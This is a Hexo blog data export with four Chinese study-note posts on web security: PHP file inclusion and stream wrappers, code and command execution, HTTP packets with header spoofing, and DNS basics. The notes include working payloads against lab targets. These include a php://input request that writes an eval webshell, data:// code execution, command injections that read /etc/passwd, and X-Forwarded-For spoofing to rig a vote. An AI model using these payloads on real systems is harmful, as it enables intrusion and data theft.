{"meta":{"title":"Al0nez's Bolg","subtitle":"我与春风皆过客,你携秋水揽星河","description":null,"author":"Al0nez","url":"https://Al0nez.github.io","root":"/"},"pages":[{"title":"分类&标签","date":"2021-09-10T02:30:39.000Z","updated":"2021-09-10T02:33:48.948Z","comments":true,"path":"tags/index.html","permalink":"https://al0nez.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"31WEB漏洞-文件操作之文件包含漏洞全解","slug":"31WEB漏洞-文件操作之文件包含漏洞全解","date":"2021-09-21T00:50:14.000Z","updated":"2021-09-21T00:56:26.967Z","comments":true,"path":"2021/09/21/31WEB漏洞-文件操作之文件包含漏洞全解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/","excerpt":"什么是文件包含为了更好的使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。","text":"什么是文件包含为了更好的使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。 文件包含产生原因在包含文件时候，为了灵活包含文件，将包含文件设置为变量，通过动态变量引入需要包含的文件时，用户可以通过控制变量，而服务器端没有校验变量，从而导致文件包含漏洞，通常此漏洞出现在PHP中。 12345&lt;?php$file = $_GET[&#x27;file&#x27;];include($file);.......?&gt; 文件包含函数 include include_once require require_once include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。 include 和 require 语句是相同的，除了错误处理方面： require 会生成致命错误（E_COMPILE_ERROR）并停止脚本 include 只生成警告（E_WARNING），并且脚本会继续 include_once 函数会将指定的文件载入并执行里面的程序；此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。 require_once也是一样的，当处理到错误的时候，require_once会停止脚本，include_once不会。 例子文件包含代码 12345678&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename);/*$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);*/?&gt; 本来文件是txt的文本 但是通过文件包含能够执行其中的代码 检测白盒代码审计 黑盒 漏扫工具 公开漏洞 手工看参数值及功能 本地文件包含文件和网站在一个服务器上，类似像127.0.0.1/?file=../../phpinfo.php这样就属于本地文件包含 类型无限制因为1.txt在根目录下，而test/php和她有2级目录，所有需要../退俩次目录 1http://127.0.0.1/123/upload/test.php?filename=../../1.txt 有限制12$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;); include会在filename后面添加一个.html。 %00截断绕过 利用条件 magic_quotes_gpc = Off php版本&lt;5.3.4 长度截断绕过 利用条件 windows，点号需要长于250;linux长于4096 好像绕过不去了。。。。。。。 远程文件包含(危害更大)文件和网站不在一个服务器上，类似像127.0.0.1/?file=www.baidu.com这样就属于远程文件包含。 类型前提条件 allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读取远程文件 allow_url_include:为ON时，就可以使用include和require的方式包含远程文件。 无限制 如果远程代码时后门，我们就可以通过远程文件包含从而获取webshell。 有限制 通过在后面增加特殊符号来绕过 1%20、%23、? 各种协议流的玩法PHP伪协议总结file:// 协议使用条件： allow_url_fopen:off/on allow_url_fopen:off/on 作用用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\\、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 用法1234567/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext 示例1.file://[文件的绝对路径和文件名] 1http://127.0.0.1/upload-labs/include.php?file=file://D:\\phpstudy\\www\\phpinfo.txt 2.[文件的相对路径和文件名] 1http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt 3.[http：//网络路径和文件名] 这里进行远程访问的时候需要allow_url_include=On模式 1http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt php:// 协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 说明：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 参数详解该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下： php://filter 参数 描述 resource=&lt;要过滤的数据流&gt; 必须项。它指定了你要筛选过滤的数据流。 read=&lt;读链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（*\\ *）分隔。 write=&lt;写链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（\\ ）分隔。 &lt;; 两个链的过滤器&gt; 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。 可用的过滤器列表（4类）此处列举主要的过滤器类型，详细内容请参考：https://www.php.net/manual/zh/filters.php 字符串过滤器 作用 string.rot13 等同于str_rot13()，rot13变换 string.toupper 等同于strtoupper()，转大写字母 string.tolower 等同于strtolower()，转小写字母 string.strip_tags 等同于strip_tags()，去除html、PHP语言标签 转换过滤器 作用 convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码 压缩过滤器 作用 zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。 加密过滤器 作用 mcrypt.* libmcrypt 对称加密算法 mdecrypt.* libmcrypt 对称解密算法 示例： php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码） 1http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php php://input + [POST DATA]执行php代码 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt; 若有写入权限，写入一句话木马 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; 参考：https://php.net/manual/zh/wrappers.php.php zip:// &amp; bzip2:// &amp; zlib:// 协议 条件： allow_url_fopen:off/on allow_url_include :off/on 作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。 示例： zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23） 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt compress.bzip2://file.bz2 压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2 compress.zlib://file.gz 压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz 参考：http://php.net/manual/zh/wrappers.compression.php data://协议 条件： allow_url_fopen:on allow_url_include :on 作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法： 12data://text/plain,data://text/plain;base64, 示例： data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https://协议 条件： allow_url_fopen:on allow_url_include :on 作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。 用法： 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com 示例： 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt phar://协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例： 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：phar://协议对象注入技术。 因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。 参考文章：seebug - 利用 phar 拓展 php 反序列化漏洞攻击面 涉及资源： https://www.seebug.org/vuldb/ssvid-98122 https://www.ichunqiu.com/battalion?t=1&amp;r=57475 https://blog.csdn.net/Cheng_May/article/details/78600833 https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件包含","slug":"文件包含","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"30WEB漏洞--代码及命令执行","slug":"30Web漏洞-代码及命令执行","date":"2021-09-12T08:49:37.000Z","updated":"2021-09-21T00:47:49.996Z","comments":true,"path":"2021/09/12/30Web漏洞-代码及命令执行/","link":"","permalink":"https://al0nez.github.io/2021/09/12/30Web%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"前言在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。","text":"前言在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。 代码执行 RCE 漏洞形成 可控变量 漏洞函数 原理会将我们输入的数据当做代码来执行，如果我们当前的网站是PHP就当做PHP语言来执行。 检测白盒 代码审计 黑盒 漏扫工具 公开漏洞 手工看参数值及功能点 相关函数1eval() 将输入的字符串当做PHP代码执行 1assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动 1call_user_func() 把第一参数作为回调函数 1call_user_func_array() 调用回到函数,并把第一个数组参数作为回到函数的参数 1array_map() 为数组的每个元素应用回调函数 防御 敏感函数禁用 变量过滤或固定 WAF产品 案例演示这题是一个白盒测试，需要代码审计 该代码是将一个字符串进行解密，然后执行脚本命令 解密后发现是接收一个a参数 直接使用?a=ls执行命令 命令执行系统 linux windows 原理应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。 形成 可控变量 漏洞函数 命令拼接Linux 12345678910111213A;B A 不论正确与否都会执行 BA&amp;B A 后台运行，A 和 B 同时执行A&amp;&amp;B A 执行成功时候才会执行 B 命令A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令A||B A 执行失败后才会执行 B 命令`` 反单引号linux下会当做命令来执行127.0.0.1 ; cat /etc/passwd 127.0.0.1 &amp; cat /etc/passwd 127.0.0.1 &amp;&amp; cat /etc/passwd 127.0.0.1 | cat /etc/passwd 233 || cat /etc/passwd windows 1234&quot;|&quot;: 直接执行后面的语句。&quot;||&quot;: 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。&quot;&amp;&quot;： 两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。&quot;&amp;&amp;&quot;： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执 行,前面的语句只能为真。 php相关函数 system(args) 有回显 passthru(args)(有回显) exec(args) （回显最后一行-必须echo输出） shell_exec(args) （无回显-必须输出） 反引号：`` popen(handle,mode)(无回显) proc_open(‘cmd’,‘flag’,‘flag’)（无回显） $process = proc_open(‘dir’,$des,$pipes); echo stream_get_contents($pipes[1]); 案例演示墨者命令注入执行分析 通过抓包绕过前端js检测。使用;进行命令拼接 1iipp=127.0.0.1;ls&amp;submit=Ping 1iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping 成功获取flag 1mozhe1af4b8cc599a0a837919be1d30d 涉及资源：123456789101112https://www.cnblogs.com/ermei/p/6689005.htmlhttp://blog.leanote.com/post/snowming/9da184ef24bdhttps://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"代码执行","slug":"代码执行","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"命令执行","slug":"命令执行","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"02基础入门--数据包拓展","slug":"02基础入门-数据包拓展","date":"2021-09-12T08:48:57.000Z","updated":"2021-09-21T00:47:34.869Z","comments":true,"path":"2021/09/12/02基础入门-数据包拓展/","link":"","permalink":"https://al0nez.github.io/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/","excerpt":"小迪学习第二天","text":"小迪学习第二天 网站解析对应简要网站搭建过程https://www.cnblogs.com/GodSince/p/12010184.html 涉及到的攻击层面？源码，搭建平台，系统，网络层等 涉及到的安全问题？目录，敏感文件，弱口令，IP 及域名等 HTTP/S数据包Request请求数据包 Response返回数据包 Request请求数据包 Proxy代理服务器 Response返回数据包 关于HTTP和HTTPSHTTP（HyperText Transfer Protocol：超文本传输协议）是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。 HTTP 默认工作在 TCP 协议 80 端口，用户访问网站 http:// 打头的都是标准 HTTP 服务。 HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。 HTTPS（Hypertext Transfer Protocol Secure：超文本传输安全协议）是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。 HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式： 1、TCP 三次同步握手 2、客户端验证服务器数字证书 3、DH 算法协商对称加密算法的密钥、hash 算法的密钥 4、SSL 安全加密隧道协商完成 5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。 HTTP和HTTPS的简要通信过程 HTTP： 12345建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与 web 服务器之间的连接2.浏览器将请求数据打包（生成请求数据包）并发送到 web 服务器3.web 服务器将处理结果打包（生成响应数据包）并发送给浏览器4.web 服务器关闭连接 HTTPS： HTTP/HTTPS 具体区别？ HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。 使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。 HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。 http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。 HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。 Request 请求数据包数据格式1234请求行：请求类型/请求资源路径、协议的版本和类型请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义空行：请求头与请求体之间用一个空行隔开；请求体：要发送的数据(一般 post 提交会使用)；例：user=123&amp;pass=123 例如：Request Headers 12345678910111213POST /adduser HTTP/1.1Host: localhost:8030Connection: keep-aliveContent-Length: 16Pragma: no-cacheCache-Control: no-cacheOrigin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcmUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/66.0.3359.181 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9 请求行请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。 例如： 1GET /index.html HTTP/1.1 HTTP 规划定义了 8 种可能的请求方法： 12345678GET：检索 URL 中标识资源的一个简单请求HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档POST：服务器接受被写入客户端输出流中的数据的请求PUT：服务器保存请求数据作为指定 URL 新内容的请求DELETE：服务器删除 URL 中命令的资源的请求OPTIONS：关于服务器支持的请求方法信息的请求TRACE：web 服务器反馈 Http 请求和其头标的请求CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 1234567891011121314HOST: 主机或域名地址Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。User-Agent：是客户浏览器名称Host：对应网址 URL 中的 Web 名称和端口号。Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。 空行最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 请求数据使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。 Response 返回数据包数据格式一个响应由四个部分组成；状态行、响应头标、空行、响应数据。 1234状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔响应头标：包含服务器类型、日期、长度、内容类型等空行：响应头与响应体之间用空行隔开响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面 HTTP 响应码：123451xx：信息，请求收到，继续处理2xx：成功，行为被成功地接受、理解和采纳3xx：重定向，为了完成请求，必须进一步执行的动作4xx：客户端错误5xx：服务器错误 响应头标想请求头标一样，他们指出服务器的功能，标识出响应数据的细节 空行最后一个响应头标之后是一个空行，发送回车间和退行，表明服务器以下不再有头标 响应数据HTML文档和图像等，也是HTML本身 演示案例Burp Suite 抓包 第三方检测修改实现XSS攻击已经被修复了。 来源页伪造https://www.mozhe.cn/bug/detail/56 在burp上进行抓包进行来源页吗修改 修改Referer参数，地址来源 浏览器信息伪造 需要伪造IPhone手机和2G信号 通过伪造User-Agent来实现 1Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G 成功伪造 HTTP动作练习这里应该是需要将GET方式改为POST方式，bp抓包然后选择变更请求方式，然后发包。 投票系统缺陷要求让ggg获得第一。 抓一下包看一下。应该是通过ip去限制投票次数，这里使用X-Forwarded-For来伪造ip，然后就可以无限投票了。 成功得到第一","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"01基础入门--概念名词","slug":"01基础入门-概念名词","date":"2021-09-10T07:15:08.000Z","updated":"2021-09-21T00:47:24.835Z","comments":true,"path":"2021/09/10/01基础入门-概念名词/","link":"","permalink":"https://al0nez.github.io/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/","excerpt":"域名什么是域名域名（Domain names）是互联网基础架构的关键部分。它们为互联网上任何可用的网页服务器提供了方便人类理解的地址。","text":"域名什么是域名域名（Domain names）是互联网基础架构的关键部分。它们为互联网上任何可用的网页服务器提供了方便人类理解的地址。 任何连上互联网的电脑都可以通过一个公共IP地址访问到，对于IPv4地址来说，这个地址有32位（它们通常写成四个范围在0~255以内，由点分隔的数字组成，比如173.194.121.32），而对于IPv6来说，这个地址有128位，通常写成八组由冒号分隔的四个十六进制数(e.g., 2027:0da8:8b73:0000:0000:8a2e:0370:1337). 计算机可以很容易地处理这些IP地址, 但是对一个人来说很难找出谁在操控这些服务器以及这些网站提供什么服务。IP 地址很难记忆而且可能会随着时间的推移发生改变 。为了解决这些问题，我们使用方便记忆的地址，称作域名。 域名在哪里注册域名注册是Internet中用于解决地址对应问题的一种方法。根据中国互联网络域名管理办法，域名注册服务机构及域名注册管理机构需对申请人提出的域名是否违反了第三方的权利和申请人的真实身份进行核验。每一个相同顶级域名中的二级域名注册都是独一无二的，不可重复的，但不同顶级域名中的二级域名可以是相同的，例如baidu这个二级域名曾可以在.com中注册，也可以在.cn中注册，也可以在.xyz中及其他多种顶级域名中注册，且每个域名都起到同样的作用。因此，在网络上域名是一种相对有限的资源，它的价值随着注册企业和个人用户的增多而逐步为人们所重视。一般域名需要通过域名注册商去注册。 顶级域名、一级域名1234567891011121314151617Top-level domains，first-level domains（TLDs），也翻译为国际顶级域名，也成一级域名。 .com 供商业机构使用，但无限制最常用 .net 原供网络服务供应商使用，现无限制 .org 原供不属于其他通用顶级域类别的组织使用，现无限制 .edu / .gov / .mil 供美国教育机构/美国政府机关/美国军事机构。因历史遗留问题一般只在美国专用 .aero 供航空运输业使用 .biz 供商业使用 .coop 供联合会（cooperatives）使用 .info 供信息性网站使用，但无限制 .museum 供博物馆使用 .name 供家庭及个人使用 .pro 供部分专业使用 .asia 供亚洲社区使用 .tel 供连接电话网络与因特网的服务使用 .post 供邮政服务使用 .mail 供邮件网站使用 国家顶级域名：cn（中国大陆）、de（德国）、eu（欧盟）、jp（日本）、hk（中国香港）、tw（中国台湾）、uk（英国）、us（美国） 什么是二级域名多级域名？二级域（或称二级域名；英语：Second-level domain；英文缩写：SLD）是互联网DNS等级之中，处于顶级域名之下的域。二级域名是域名的倒数第二个部分，例如在域名example.baidu.com中，二级域名是Baidu。 .com 顶级域名/一级域名，更准确的说叫顶级域 baidu.com 二级域名，更准确的说叫二级域 tieba.baidu.com 三级域名，更准确的说叫三级域 detail.tieba.baidu.com 四级域名，更准确的说叫四级域 ……. 域名发现对于安全测试意义？ 进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。 DNS什么是DNS？DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 例如百度的域名是www.baidu.com,在DNS中对应的IP是1.2.3.4(假设),那么我们在浏览器中输入百度的域名，DNS就会解析为1.2.3.4。 本地HOSTS与DNS的关系？客户端查询DNS的过程是： 1本地host文件—本地缓存—-DNS服务器 Hosts文件目录 1在Windows中，它的目录通常在C盘的Windows\\system32\\drivers\\etc\\下。 Hosts文件是一个纯文本文件，用记事本就可以将其打开。这个文件是根据TCP/IP for Windows 的标准来工作的，它的作用是包含IP地址和Host name(主机名)的映射关系，每段只能包括一个映射关系，IP地址要放在每段的最前面，后面写Host name(主机名)，中间加个空格。如：127.0.0.1 localhost. 我们知道，当电脑访问网站时，首先通过DNS服务器把网络 域名解析成IP地址后，我们的计算机才能访问。如果每个域名请求都要等待域名服务器解析后返回IP，访问速度就会比较慢，而Hosts文件正可以解决这个问题。在进行DNS请求以前，Windows系统会先检查Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向DNS服务器提出域名解析。 eg：这里用我自己的博客地址作为演示，当我们ping l0ne1y.github.io的时候可以看到他的ip地址是185.199.110.153。 当我们修改了本地hosts文件后，再次ping l0ne1y.github.io地址，发现ip地址变成了1.2.3.4。 CDN是什么？与DNS的关系？CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个CDN服务器，上面缓存住一些数据，深圳用户访问时先访问这个CDN服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。 CDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点. 常见的DNS安全攻击有哪些? 域名劫持 通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。这显然是DNS服务提供商的责任，用户束手无策。 缓存投毒 